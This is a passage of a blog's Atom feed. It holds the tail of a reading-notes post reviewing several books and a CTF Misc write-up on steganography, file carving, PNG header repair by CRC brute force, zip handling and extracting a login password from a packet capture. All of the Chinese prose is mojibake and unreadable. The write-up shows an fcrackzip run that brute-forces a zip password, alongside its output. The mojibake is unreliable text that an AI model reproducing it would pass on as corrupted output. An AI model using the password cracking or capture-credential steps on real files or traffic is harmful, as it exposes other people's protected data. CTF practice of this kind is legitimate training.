”ç©¶å†…å®¹çš„å‡ç»ƒï¼Œå°†ç»æµå­¦åŸç†ä¸ä¸­å›½ç»æµå‘å±•çš„å®è·µæœ‰æœºèåˆï¼Œä»¥åœ°æ–¹æ”¿åºœæŠ•èèµ„ä¸ºä¸»çº¿ï¼Œæ·±å…¥æµ…å‡ºåœ°è®ºè¿°äº†ä¸­å›½ç»æµçš„å‘å±•ï¼Œç¬”è§¦ç®€ç»ƒå®¢è§‚ï¼Œå¹¶å¹¿æ³›é‡‡çº³äº†å„é¢†åŸŸå­¦è€…çš„æœ€æ–°ç ”ç©¶æˆæœã€‚å…¨ä¹¦åˆ†ä¸Šä¸‹ä¸¤ç¯‡ã€‚ä¸Šç¯‡è§£é‡Šå¾®è§‚æœºåˆ¶ï¼ŒåŒ…æ‹¬åœ°æ–¹æ”¿åºœçš„åŸºæœ¬äº‹åŠ¡ã€æ”¶æ”¯ã€åœŸåœ°èèµ„å’Œå¼€å‘ã€æŠ•èµ„å’Œå€ºåŠ¡ç­‰ï¼›ä¸‹ç¯‡è§£é‡Šè¿™äº›å¾®è§‚è¡Œä¸ºä¸å®è§‚ç°è±¡çš„è”ç³»ï¼ŒåŒ…æ‹¬åŸå¸‚åŒ–å’Œå·¥ä¸šåŒ–ã€æˆ¿ä»·ã€åœ°åŒºå·®å¼‚ã€å€ºåŠ¡é£é™©ã€å›½å†…ç»æµç»“æ„å¤±è¡¡ã€å›½é™…è´¸æ˜“å†²çªç­‰ã€‚æœ€åä¸€ç« æç‚¼å’Œæ€»ç»“å…¨ä¹¦å†…å®¹ã€‚é€šè¿‡å¯¹ä¸­å›½æ”¿æ²»ç»æµä½“ç³»çš„è®ºè¿°ï¼Œä½œè€…ç®€æ˜åœ°åˆ»ç”»äº†åœ°æ–¹æ”¿åºœè¿›è¡Œç»æµæ²»ç†çš„åŸºæœ¬æ–¹å¼ï¼Œå¹¶æŒ‡å‡ºï¼Œä¸­å›½æ”¿åºœé€šè¿‡æ·±åº¦ä»‹å…¥å·¥ä¸šåŒ–å’ŒåŸå¸‚åŒ–çš„è¿›ç¨‹ï¼Œåœ¨å‘å±•ç»æµçš„åŒæ—¶é€æ­¥æ¨åŠ¨äº†å¸‚åœºæœºåˆ¶çš„å»ºç«‹å’Œå®Œå–„ï¼Œä»¥ä¸€ç§æœ‰åˆ«äºæ‰€è°“å‘è¾¾å›½å®¶ç»éªŒçš„æ–¹å¼å®ç°äº†ç»æµå¥‡è¿¹ã€‚åŸºäºå¯¹æ”¹é©å†ç¨‹ä¸ç¤¾ä¼šçŸ›ç›¾çš„å›é¡¾ä¸åˆ†æï¼Œä½œè€…ä¹Ÿåœ¨ä¹¦ä¸­å¯¹å½“å‰æ¨è¿›çš„å¸‚åœºåŒ–æ”¹é©ä¸æ”¿åºœè½¬å‹è¿›è¡Œäº†è§£è¯»ï¼Œå¸®åŠ©è¯»è€…å¢è¿›å¯¹ä¸­å›½å‘å±•ç°å®çš„æŠŠæ¡ã€‚</p><h4 id="è¥¿çº¿æ— æˆ˜äº‹"><a href="#è¥¿çº¿æ— æˆ˜äº‹" class="headerlink" title="è¥¿çº¿æ— æˆ˜äº‹"></a>è¥¿çº¿æ— æˆ˜äº‹</h4><p><img src="/2022/12/15/è¯»ä¹¦åˆ†äº«II/3.jpeg" alt="3" style="zoom:50%;"></p><p><strong>ä¸€ä¸ªå£«å…µåªæœ‰åº¦è¿‡ä¸€åƒæ¬¡å¶ç„¶æ€§æ‰èƒ½ç®—æ´»ç€ã€‚æ¯ä¸ªå£«å…µéƒ½ç›¸ä¿¡å’Œä¿¡èµ–è¿™ç§å¶ç„¶æ€§ã€‚</strong></p><p>é’å¹´ä¿ç½—Â·åšä¼Šé»˜å°”ã€é’³å·¥åŠ ç™»ã€å§‹ç»ˆéšèº«å¸¦ç€è¯¾æœ¬çš„ç±³å‹’ã€å¤´è„‘æœ€æ¸…é†’çš„ä¸‹å£«å…‹ç½—æ™®ã€æŒ–ç…¤å·¥æµ·å°”Â·ç»´æ–¯èƒ¡æ–¯ã€å†œæ°‘å¾·ç‰¹æ—ï¼Œä»¥åŠæ–¯å¦å°¼æ–¯åŠ³æ–¯Â·å¡é’¦æ–¯åŸºä»¬ï¼Œç»è¿‡åå‘¨çš„å†›äº‹è®­ç»ƒåï¼Œè¢«é€å¾€å‰çº¿ã€‚1918å¹´ï¼Œè¿™ä¸ªç­çš„æœ€åä¸€äººä¹Ÿäºå‰çº¿é˜µäº¡ã€‚è€Œå†›é˜ŸæŒ‡æŒ¥éƒ¨æˆ˜æŠ¥ä¸Šçš„è®°å½•ä»…æœ‰ä¸€å¥ï¼šè¥¿çº¿æ— æˆ˜äº‹ã€‚</p><p>èŠ±äº†ä¸€å‘¨æ—¶é—´æ–­æ–­ç»­ç»­è¯»å®Œäº†è¿™æœ¬ä¹¦ã€‚ä½œè€…ç»å†è¿‡ä¸€æˆ˜ï¼Œæ‰€ä»¥åœ¨ä¹¦ä¸­å¯¹äºæˆ˜äº‰çš„æè¿°ååˆ†è¯¦ç»†ã€‚æˆ‘è¯»çš„æ˜¯å§œä¹™ç¿»è¯‘çš„ç‰ˆæœ¬ï¼Œä¸ªäººæ„Ÿè§‰ç¿»è¯‘çš„å¾ˆå¥½ï¼æˆ˜äº‰æ˜¯æ®‹é…·çš„ï¼Œå¯¹äºäº¤æˆ˜åŒæ–¹ï¼Œæ²¡æœ‰å¯¹é”™ï¼Œæˆ˜åœºä¸Šå¥‹æˆ˜çš„å†›äººï¼Œåœºä¸‹æ˜¯å­©å­çš„çˆ¶äº²ï¼Œæ˜¯çˆ¶äº²çš„å­©å­ï¼Œæ˜¯å¦»å­çš„ä¸ˆå¤«ã€‚å¡å°”ç»´äºšçš„ä¸€å¥è¯è¯´é“ï¼šåœ¨æˆ˜äº‰ä¸­ï¼Œæ”¿æ²»å®¶æä¾›å¼¹è¯ã€å¯Œäººæä¾›ç²®é£Ÿã€ç©·äººæä¾›å­©å­ã€‚æˆ˜äº‰ç»“æŸï¼Œæ”¿æ²»å®¶æ”¶å›å¼¹è¯ï¼Œå¯Œäººç»§ç»­ç§ç²®é£Ÿï¼Œç©·äººåŸ‹è‘¬è‡ªå·±çš„å­©å­ã€‚</p><h4 id="å¯»è·¯ä¸­å›½"><a href="#å¯»è·¯ä¸­å›½" class="headerlink" title="å¯»è·¯ä¸­å›½"></a>å¯»è·¯ä¸­å›½</h4><p><img src="/2022/12/15/è¯»ä¹¦åˆ†äº«II/4.jpeg" alt="4" style="zoom:50%;"></p><p><strong>åœ¨æ”¹é©å¹´ä»£ï¼Œæ¯ä¸ªäººéƒ½çŸ¥é“è¿™æ¡åŸºæœ¬çš„å‡†åˆ™ï¼šäº‹åæ±‚è°…è§£ï¼Œæ¯”äº‹å‰æ±‚è®¸å¯è¦å®¹æ˜“å¤šäº†ã€‚</strong></p><p>ã€Šå¯»è·¯ä¸­å›½ã€‹ä¸€ä¹¦æœ‰å‡ æ¡ä¸åŒçš„çº¿ç´¢ã€‚å®ƒé¦–å…ˆå™è¿°äº†ä½œè€…ç”±ä¸œæµ·ä¹‹æ»¨æ²¿ç€é•¿åŸä¸€è·¯å‘è¥¿ï¼Œæ¨ªè·¨ä¸­å›½åŒ—æ–¹çš„ä¸‡é‡Œè¡Œç¨‹ï¼›å¦ä¸€æ¡çº¿ç´¢é›†ä¸­è®²è¿°äº†ä¸€ä¸ªå› ä¸­å›½æ±½è½¦ä¸šçš„é«˜é€Ÿå‘å±•è€Œå‘ç”Ÿå·¨å˜çš„ä¹¡æ‘ï¼Œåœ¨è¿™é‡Œï¼Œä½œè€…ç‰¹å†™äº†ä¸€ä¸ªå†œæ°‘å®¶åº­ç”±å†œè€Œå•†çš„å˜åŒ–ç»å†ï¼›æœ€åï¼Œåˆ™æ˜¯ä¸­å›½ä¸œå—éƒ¨ä¸€ä¸ªå·¥ä¸šå°é•‡çš„åŸå¸‚ç”Ÿæ´»åœºæ™¯ã€‚ä¹¦ä¸­æ‰€æè¿°çš„è¿™ç§ç”±å†œè€Œå·¥è€Œå•†ã€ä¹¡æ‘å˜èº«åŸå¸‚çš„å‘å±•ï¼Œæ­£æ˜¯1978å¹´æ”¹é©ä»¥æ¥ä¸­å›½æ‰€å‘ç”Ÿçš„æœ€é‡è¦çš„å˜åŒ–ã€‚</p><p>ã€Šå¯»è·¯ä¸­å›½ã€‹ä»¥ä¸‰ä¸ªè§’åº¦åˆ‡å…¥ï¼Œåˆ†åˆ«æ˜¯åŸå¢™ã€æ‘åº„å’Œå·¥å‚ã€‚åœ¨ç§Ÿè½¦å‡ºè¡Œé€”ä¸­ï¼Œä½œè€…å°†è‡ªå·±çš„æ‰€è§æ‰€é—»æ‰€æ€æ‰€æƒ³å†™äº†å‡ºæ¥ï¼Œé˜…è¯»å®Œè¿™æœ¬ä¹¦ç»™æˆ‘çš„æ„Ÿå—å°±æ˜¯å¾ˆçœŸè¯šã€‚</p><h4 id="å››ä¸–åŒå ‚"><a href="#å››ä¸–åŒå ‚" class="headerlink" title="å››ä¸–åŒå ‚"></a>å››ä¸–åŒå ‚</h4><p><img src="/2022/12/15/è¯»ä¹¦åˆ†äº«II/5.jpeg" alt="5" style="zoom:50%;"></p><p><strong>åªæœ‰ä¸€å¥è¯ï¼åˆ°ä»€ä¹ˆæ—¶å€™éƒ½ä¸è®¸ç°å¿ƒï¼äººä¸€ç°å¿ƒä¾¿åªçœ‹åˆ°åˆ«äººçš„é”™å¤„ï¼Œè€Œçœ‹ä¸åˆ°è‡ªå·±çš„æ¶ˆæ²‰å •è½ï¼</strong></p><p>è¿™æ˜¯ä¸€éƒ¨ä¸­å›½ç°ä»£é•¿ç¯‡å°è¯´ç»å…¸åè‘—ï¼Œæ˜¯è€èˆå…ˆç”Ÿçš„ä»£è¡¨ä½œä¹‹ä¸€ã€‚å°è¯´åœ¨å¢æ²Ÿæ¡¥äº‹å˜çˆ†å‘ã€åŒ—å¹³æ²¦é™·çš„æ—¶ä»£èƒŒæ™¯ä¸‹ï¼Œä»¥ç¥å®¶å››ä¸–åŒå ‚çš„ç”Ÿæ´»ä¸ºä¸»çº¿ï¼Œå½¢è±¡ã€çœŸåˆ‡åœ°æç»˜äº†ä»¥å°ç¾Šåœˆèƒ¡åŒä½æˆ·ä¸ºä»£è¡¨çš„å„ä¸ªé˜¶å±‚ã€å„è‰²äººç­‰çš„è£è¾±æµ®æ²‰ã€ç”Ÿæ­»å­˜äº¡ã€‚ä½œå“è®°å™äº†åŒ—å¹³æ²¦é™·åçš„ç•¸å½¢ä¸–æ€ä¸­ï¼Œæ—¥å¯‡é“è¹„ä¸‹å¹¿å¤§å¹³æ°‘çš„æ‚²æƒ¨é­é‡ï¼Œé‚£ä¸€æ´¾å¤è€ã€å®é™ç”Ÿæ´»è¢«æ‰“ç ´åçš„ä¸å®‰ã€æƒ¶æƒ‘ä¸éœ‡æ’¼ï¼Œé­æŒäº†é™„æ•Œä½œæ¶è€…çš„ä¸‘æ¶çµé­‚ï¼Œæ­éœ²äº†æ—¥æœ¬å†›å›½ä¸»ä¹‰çš„æ®‹æš´ç½ªè¡Œï¼Œæ›´åæ˜ å‡ºç™¾å§“ä»¬é¢å¯¹å¼ºæ•Œæ„¤è€ŒåæŠ—çš„è‹±å‹‡æ— ç•ï¼Œè®´æ­Œã€å¼˜æ‰¬äº†ä¸­å›½äººæ°‘ä¼Ÿå¤§çš„çˆ±å›½ä¸»ä¹‰ç²¾ç¥å’Œåšè´é«˜å°šçš„æ°‘æ—æ°”èŠ‚ï¼Œå²è¯—èˆ¬åœ°å±•ç°äº†ç¬¬äºŒæ¬¡ä¸–ç•Œå¤§æˆ˜æœŸé—´ï¼Œä¸­å›½äººæ°‘ä¸ºä¸–ç•Œåæ³•è¥¿æ–¯æˆ˜äº‰åšå‡ºçš„æ°å‡ºè´¡çŒ®ï¼Œæ°”åº¦æ¢å¼˜ï¼Œå¯æ­Œå¯æ³£ã€‚</p><p>èŠ±äº†32ä¸ªå°æ—¶è¯»å®Œäº†è¿™æœ¬ä¹¦ã€‚è¯´æ˜¯è¯»å®Œï¼Œå…¶å®åªæ˜¯è¯»å®Œäº†å‰87æ®µï¼Œåé¢13æ®µæ²¡æœ‰çœ‹åˆ°ã€‚åœ¨æˆ‘çœ‹çš„87æ®µä¸­ï¼Œå››ä¸–åŒå ‚å‘ç”Ÿçš„æ•…äº‹ä»1937å¹´å†™åˆ°äº†1941å¹´ã€‚é€šè¿‡å°ç¾Šåœˆèƒ¡åŒé‡Œçš„äººæŠ˜å°„å‡ºæ•´ä¸ªåŒ—å¹³æ‰€é¢ä¸´çš„é—®é¢˜ã€‚çœ‹åˆ°äº†æ—¥æœ¬äººçš„æ®‹å¿ï¼Œä¹Ÿçœ‹åˆ°äº†å°ç¾Šåœˆèƒ¡åŒé‡Œäººä»¬çš„äº’ç›¸å¸®åŠ©ã€‚ç‘å…¨çš„å‹‡æ•¢åšå†³ã€é’±å…ˆç”Ÿçš„å®æ­»ä¸å±ˆã€éŸµæ¢…çš„æ¸©æŸ”è´¤æƒ ã€å† æ™“è·çš„å‘é„™ä¸‹æµç­‰ï¼Œåœ¨è€èˆå…ˆç”Ÿç¬”ä¸‹äººç‰©å½¢è±¡åˆ»ç”»çš„æ ©æ ©å¦‚ç”Ÿã€‚é˜…è¯»çš„æ—¶å€™æˆ‘å¸¸å¸¸åœ¨æƒ³ï¼Œå¦‚æœå°†è‡ªå·±å¸¦å…¥åˆ°é‚£ä¸ªå¹´ä»£ï¼Œæˆ‘ä¼šæˆä¸ºä»€ä¹ˆæ ·çš„äººå‘¢ï¼Ÿ</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;æœèŠ±å¤•æ‹¾&quot;&gt;&lt;a href=&quot;#æœèŠ±å¤•æ‹¾&quot; class=&quot;headerlink&quot; title=&quot;æœèŠ±å¤•æ‹¾&quot;&gt;&lt;/a&gt;æœèŠ±å¤•æ‹¾&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2022/12/15/è¯»ä¹¦åˆ†äº«II/1.jpeg&quot; alt=&quot;1&quot; style=&quot;zoom:50%;&quot;
      
    
    </summary>
    
    
      <category term="éšç¬”" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>CTF Misc</title>
    <link href="elssm.github.io/2022/12/13/CTF-Misc/"/>
    <id>elssm.github.io/2022/12/13/CTF-Misc/</id>
    <published>2022-12-13T01:37:41.000Z</published>
    <updated>2022-12-15T08:22:51.640Z</updated>
    
    <content type="html"><![CDATA[<h4 id="é‡‘ä¸‰èƒ–"><a href="#é‡‘ä¸‰èƒ–" class="headerlink" title="é‡‘ä¸‰èƒ–"></a>é‡‘ä¸‰èƒ–</h4><p>zipä¸‹è½½åæœ‰ä¸€å¼ gifï¼Œç›´æ¥æ‹–å…¥åˆ°StegSolveä¸­åˆ†å¸§æŸ¥çœ‹ï¼Œå¾—åˆ°flag</p><p><img src="/2022/12/13/CTF-Misc/1.png" alt="1"></p><p><img src="/2022/12/13/CTF-Misc/2.png" alt="2"></p><p><img src="/2022/12/13/CTF-Misc/3.png" alt="3"></p><p><img src="/2022/12/13/CTF-Misc/4.png" alt="4"></p><h4 id="äºŒç»´ç "><a href="#äºŒç»´ç " class="headerlink" title="äºŒç»´ç "></a>äºŒç»´ç </h4><p>ä¸‹è½½ä¹‹åæ˜¯ä¸€ä¸ªpngå›¾ç‰‡ï¼Œä½¿ç”¨<code>hex fiend</code>æ‰“å¼€ä¹‹åå‘ç°é‡Œé¢æœ‰ä¸€ä¸ª<code>number.txt</code>æ–‡ä»¶</p><p><img src="/2022/12/13/CTF-Misc/5.png" alt="5"></p><p>æ¥ç€ä½¿ç”¨<code>foremost</code>åˆ†ç¦»æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % foremost QR_code.png</span><br><span class="line">foremost: /usr/local/etc/foremost.conf: No such file or directory</span><br><span class="line">Processing: QR_code.png</span><br><span class="line">ï¿½foundat=4number.txtn</span><br><span class="line">Qjxuï¿½Jï¿½ï¿½ï¿½ï¿½[ï¿½ï¿½ï¿½ï¿½OPF4Lï¿½</span><br><span class="line">*|</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¾“å‡ºï¼Œé‡Œé¢æœ‰ä¸€ä¸ªzipæ–‡ä»¶ï¼Œæ‰“å¼€é‡Œé¢æœ‰ä¸€ä¸ª<code>4number.txt</code>æ–‡ä»¶ï¼Œéœ€è¦ä¸€ä¸ªå››ä½å¯†ç ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % tree output</span><br><span class="line">output</span><br><span class="line">â”œâ”€â”€ audit.txt</span><br><span class="line">â”œâ”€â”€ png</span><br><span class="line">â”‚Â Â  â””â”€â”€ 00000000.png</span><br><span class="line">â””â”€â”€ zip</span><br><span class="line">    â””â”€â”€ 00000000.zip</span><br><span class="line"></span><br><span class="line">2 directories, 3 files</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>fcrackzip</code>å¼€å§‹ç ´è§£å¯†ç </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">-&gt;</span> % fcrackzip -b -c '1' -l 4 -u 00000000.zip</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PASSWORD FOUND!!!!: pw == 7639</span><br></pre></td></tr></table></figure><h4 id="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"><a href="#ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°" class="headerlink" title="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"></a>ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°</h4><p>zipè§£å‹åæ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œä¸¢åˆ°StegSolveä¸­è¿›è¡Œæ–‡ä»¶æ ¼å¼åˆ†æã€‚ç›´æ¥è·å–åˆ°<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/6.png" alt="6"></p><h4 id="å¤§ç™½"><a href="#å¤§ç™½" class="headerlink" title="å¤§ç™½"></a>å¤§ç™½</h4><p>zipä¸‹è½½åå‘ç°æ‰“ä¸å¼€å›¾ç‰‡ï¼Œ<code>StegSolve</code>æ‰“å¼€åå‘ç°å›¾ç‰‡å°‘äº†ä¸€åŠã€‚</p><p><img src="/2022/12/13/CTF-Misc/7.png" alt="7"></p><p>å¯¹äºä¸€ä¸ª PNG æ–‡ä»¶æ¥è¯´ï¼Œå…¶æ–‡ä»¶å¤´æ€»æ˜¯ç”±ä½å›ºå®šçš„å­—èŠ‚æ¥æè¿°çš„ï¼Œå‰©ä½™çš„éƒ¨åˆ†ç”± 3 ä¸ªä»¥ä¸Šçš„ PNG çš„æ•°æ®å—ï¼ˆChunkï¼‰æŒ‰ç…§ç‰¹å®šçš„é¡ºåºç»„æˆã€‚å…·ä½“æ ¼å¼å¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PNGæ–‡ä»¶å¤´éƒ¨æ ¼å¼å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line">- ï¼ˆå›ºå®šï¼‰å…«ä¸ªå­—èŠ‚89 50 4E 47 0D 0A 1A 0Aä¸ºpngçš„æ–‡ä»¶å¤´</span><br><span class="line">- ï¼ˆå›ºå®šï¼‰å››ä¸ªå­—èŠ‚00 00 00 0Dï¼ˆå³ä¸ºåè¿›åˆ¶çš„13ï¼‰ä»£è¡¨æ•°æ®å—çš„é•¿åº¦ä¸º13</span><br><span class="line">- ï¼ˆå›ºå®šï¼‰å››ä¸ªå­—èŠ‚49 48 44 52ï¼ˆå³ä¸ºASCIIç çš„IHDRï¼‰æ˜¯æ–‡ä»¶å¤´æ•°æ®å—çš„æ ‡ç¤ºï¼ˆIDCHï¼‰</span><br><span class="line">- ï¼ˆå¯å˜ï¼‰13å­—èŠ‚æ•°æ®å—ï¼ˆIHDR)</span><br><span class="line">    - å‰å››ä¸ªå­—èŠ‚ä»£è¡¨è¯¥å›¾ç‰‡çš„å®½</span><br><span class="line">    - åå››ä¸ªå­—èŠ‚ä»£è¡¨è¯¥å›¾ç‰‡çš„é«˜</span><br><span class="line">    - åäº”ä¸ªå­—èŠ‚ä¾æ¬¡ä¸ºï¼š</span><br><span class="line">    Bit depthã€ColorTypeã€Compression methodã€Filter methodã€Interlace method</span><br><span class="line">- ï¼ˆå¯å˜ï¼‰å‰©ä½™å››å­—èŠ‚ä¸ºè¯¥pngçš„CRCæ£€éªŒç ï¼Œç”±ä»IDCHåˆ°IHDRçš„åä¸ƒå­—èŠ‚è¿›è¡Œcrcè®¡ç®—å¾—åˆ°ã€‚</span><br></pre></td></tr></table></figure><p><code>hex fiend</code>æ‰“å¼€å›¾ç‰‡å¦‚ä¸‹ã€‚</p><p><img src="/2022/12/13/CTF-Misc/8.png" alt="8"></p><p>å› æ­¤ä»å›¾ç‰‡ä¸Šå¯ä»¥çœ‹åˆ°<code>crc</code>æ ¡éªŒç ä¸º<code>0x6D7C7135</code></p><p>å°è¯•å¯¹å›¾ç‰‡çš„é«˜åº¦è¿›è¡Œä¿®å¤ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ–‡ä»¶å®½åº¦ä¸èƒ½ä»»æ„ä¿®æ”¹ï¼Œéœ€è¦æ ¹æ®IHDRå—çš„CRCå€¼çˆ†ç ´å¾—åˆ°å®½åº¦, å¦åˆ™å›¾ç‰‡æ˜¾ç¤ºé”™è¯¯ä¸èƒ½å¾—åˆ°flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">misc = open(<span class="string">"dabai.png"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">'&gt;i'</span>,i)+ misc[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0x6d7c7135</span>:</span><br><span class="line">        <span class="keyword">print</span> i</span><br></pre></td></tr></table></figure><p>å¾—åˆ°é«˜åº¦ä¸º479ï¼Œåå…­è¿›åˆ¶ä¸º<code>0x01df</code></p><p>éšåæˆ‘ä»¬åœ¨<code>hex fiend</code>ä¸­å¯¹å›¾ç‰‡çš„é«˜åº¦è¿›è¡Œä¿®æ”¹ï¼Œä¿®æ”¹åæ‰“å¼€å›¾ç‰‡çœ‹åˆ°<code>flag</code>ã€‚</p><p><img src="/2022/12/13/CTF-Misc/9.png" alt="9"></p><h4 id="Nç§æ–¹æ³•è§£å†³"><a href="#Nç§æ–¹æ³•è§£å†³" class="headerlink" title="Nç§æ–¹æ³•è§£å†³"></a>Nç§æ–¹æ³•è§£å†³</h4><p>ä¸‹è½½ä¸‹æ¥æ˜¯ä¸€ä¸ª<code>key.exe</code>ï¼Œæ‹–åˆ°<code>hex fiend</code>æŸ¥çœ‹å‘ç°æ˜¯<code>imagebase64</code>æ ¼å¼</p><p><img src="/2022/12/13/CTF-Misc/10.png" alt="10"></p><p>è§£ç åæ‰«æäºŒç»´ç è·å–<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/11.png" alt="11"></p><h4 id="ä¹Œé•‡å³°ä¼šç§å›¾"><a href="#ä¹Œé•‡å³°ä¼šç§å›¾" class="headerlink" title="ä¹Œé•‡å³°ä¼šç§å›¾"></a>ä¹Œé•‡å³°ä¼šç§å›¾</h4><p><code>hex fiend</code>æ‰“å¼€å›¾ç‰‡æ‹–åˆ°æœ€åé¢çœ‹åˆ°<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/12.png" alt="12"></p><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>wiresharkæ‰“å¼€ä¸‹è½½åˆ°çš„<code>pcap</code>æ–‡ä»¶ï¼Œæ ¹æ®é¢˜ç›®æç¤ºç™»å½•å¯†ç å³ä¸º<code>flag</code>ï¼Œè¿‡æ»¤<code>POST</code>è¯·æ±‚è·å–<code>flag</code>ã€‚</p><p><img src="/2022/12/13/CTF-Misc/13.png" alt="13"></p><h4 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h4><p><code>StegSolve</code>æ‰“å¼€å›¾ç‰‡ï¼Œåœ¨ä¸åŒé€šé“ä¸­åˆ‡æ¢æŸ¥çœ‹å›¾ç‰‡ï¼Œå‘ç°<code>blue0,green0,red0</code>å’ŒåŸå§‹å›¾ç‰‡ä¸ä¸€æ ·</p><p><img src="/2022/12/13/CTF-Misc/14.png" alt="14"></p><p><img src="/2022/12/13/CTF-Misc/15.png" alt="15"></p><p><img src="/2022/12/13/CTF-Misc/16.png" alt="16"></p><p><img src="/2022/12/13/CTF-Misc/17.png" alt="17"></p><p>ä½¿ç”¨<code>Data Extract</code>åŠŸèƒ½è¿›è¡Œæå–ï¼Œä¿å­˜æˆå›¾ç‰‡ï¼Œå‘ç°æ˜¯äºŒç»´ç ï¼Œæ‰«æåè·å–åˆ°<code>flag</code></p><p><img src="/2022/12/13/CTF-Misc/18.png" alt="18"></p><h4 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h4><p>ä¸‹è½½åå‘ç°æ–‡ä»¶åŠ å¯†ï¼Œçœ‹åˆ°é¢˜ç›®æç¤ºæ˜¯zipä¼ªåŠ å¯†ï¼Œå› æ­¤ä¸éœ€è¦ä½¿ç”¨<code>fcrack</code>çˆ†ç ´ã€‚é¦–å…ˆäº†è§£ä¸€ä¸‹zipæ–‡ä»¶ã€‚</p><p>ä¸€ä¸ªzipæ–‡ä»¶ç”±ä¸‰éƒ¨åˆ†ç»„æˆ</p><ul><li>å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒº</li><li>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº</li><li>å‹ç¼©æºæ–‡ä»¶ç›®å½•ç»“æŸæ ‡å¿—</li></ul><p>å…·ä½“ç»„æˆå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">å‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºï¼š </span><br><span class="line">    50 4B 03 04ï¼šè¿™æ˜¯å¤´æ–‡ä»¶æ ‡è®°ï¼ˆ0x04034b50ï¼‰ </span><br><span class="line">    14 00ï¼šè§£å‹æ–‡ä»¶æ‰€éœ€ pkware ç‰ˆæœ¬ </span><br><span class="line">    00 00ï¼šå…¨å±€æ–¹å¼ä½æ ‡è®°ï¼ˆæœ‰æ— åŠ å¯†ï¼‰ </span><br><span class="line">    08 00ï¼šå‹ç¼©æ–¹å¼ </span><br><span class="line">    5A 7Eï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¶é—´ </span><br><span class="line">    F7 46ï¼šæœ€åä¿®æ”¹æ–‡ä»¶æ—¥æœŸ </span><br><span class="line">    16 B5 80 14ï¼šCRC-32æ ¡éªŒï¼ˆ1480B516ï¼‰ </span><br><span class="line">    19 00 00 00ï¼šå‹ç¼©åå°ºå¯¸ï¼ˆ25ï¼‰ </span><br><span class="line">    17 00 00 00ï¼šæœªå‹ç¼©å°ºå¯¸ï¼ˆ23ï¼‰ </span><br><span 